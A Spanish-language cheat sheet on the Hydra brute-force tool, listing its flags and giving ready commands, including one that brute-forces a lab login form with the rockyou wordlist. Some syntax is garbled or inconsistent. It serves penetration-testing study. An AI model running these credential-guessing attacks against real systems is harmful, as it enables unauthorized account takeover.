# Hydra

<figure><img src="../../.gitbook/assets/image (5).png" alt="" width="384"><figcaption></figcaption></figure>

## Introducción

Hydra es una herramienta para ataques de fuerza bruta.

## Comandos

Comandos Basicos:

```bash
hydra -l HOST -p PASSWORD IP SERVICE
```

Comando elaborado:

```bash
hydra -l HOST -P PASSWORD.txt SERVER SERVICE IP protocolo -t 64 -o Hydraseña.txt
```

## Flags

`-l`: Username

`-p`: Password

`-L`: Username list

`-P`: Password list

`-t`: Aumentar la velocidad del craqueo

`-o`: Para sacarlo a un archivo

`-V`: Verbose

`-d`: Modo debug, muestra todo el proceso

Su sesión de Hydra podría sufrir interrupciones por razones inesperadas. No se preocupe; Hydra cuenta con una función de reanudación integrada que se puede llamar con la opción `-R`:

```bash
hydra -R
```

## Fuerza bruta panel de login

Para poder realizar este ataque hay que indicarle a _hydra_ el método de envió, la ruta donde encontrar el panel de login, los campos para el payload y el mensaje de error que aparece al realizar un inicio de sesión incorrecto. ([Video](https://www.youtube.com/watch?v=XAlcVyx5FMA))

* Método -> POST
* Ruta -> /login.php
* Campos -> username=medusa\&password=`^PASS^`
* Mensaje de error -> Invalid credentials

```bash
hydra -l medusa -P /usr/share/wordlists/rockyou.txt 172.17.0.2 -t 64 http-post-form "/login.php:user=medusa&password=^PASS^:Invalid credentials"
```

Con ^PASS^ indicamos el campo donde queremos que ejecute el payload

## Documentación

* [Hydra oficial](https://github.com/vanhauser-thc/thc-hydra)
* [Hydra Kali](https://www.kali.org/tools/hydra/)
